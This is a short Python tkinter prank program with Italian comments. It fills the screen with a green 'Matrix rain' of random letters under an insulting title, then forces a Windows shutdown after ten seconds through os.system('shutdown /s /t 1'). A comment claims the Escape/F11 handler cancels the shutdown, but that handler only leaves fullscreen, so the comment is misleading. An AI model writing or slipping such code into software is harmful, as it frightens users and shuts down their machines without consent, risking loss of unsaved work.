import tkinter as tk
from random import choice
import os

CHARS = ["T", "R", "O", "L"]

# Caratteri "base"
def generate_grid(width, height):
    return [[choice(CHARS) for _ in range(width)] for _ in range(height)]

# Caratteri "nuovi"
def update_grid():
    global matrix_grid
    for row in range(len(matrix_grid)):
        for col in range(len(matrix_grid[0])):
            matrix_grid[row][col] = choice(CHARS)
    display_grid(matrix_grid)
    root.after(100, update_grid)  # Effetto infinito

# Caratteri a finestra
def display_grid(grid):
    matrix_text = "\n".join([" ".join(row) for row in grid])
    label.config(text=matrix_text)

# Shutdown
def close_app():
    os.system("shutdown /s /t 1")

# Annulla
def on_closing():
    root.after_cancel(task) # Interrompe
    root.destroy() # Chiude

# Funzione per tornare alla finestra e annullare l'arresto del computer
def return_to_window(event):
    root.attributes('-fullscreen', False)

# Config finestra
root = tk.Tk()
root.title("You've been fucked kid")
root.attributes('-fullscreen', True) # Fullscreen

# Dimensioni schermo
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

# Creazione caratteri
matrix_grid = generate_grid(screen_width // 12, screen_height // 12)  # Approssimazione della grandezza dei caratteri

# Testo
label = tk.Label(root, font=('Courier', 12), fg='green', bg='black')
label.pack(fill=tk.BOTH, expand=True)

# Inzio caduta
display_grid(matrix_grid)

# Avvia Matrix Rain
update_grid()

# Dopo 10 sec arresta il pc
task = root.after(10000, close_app)

root.bind('<F11>', return_to_window)
root.bind('<Escape>', return_to_window)
root.protocol("WM_DELETE_WINDOW", on_closing)

root.mainloop()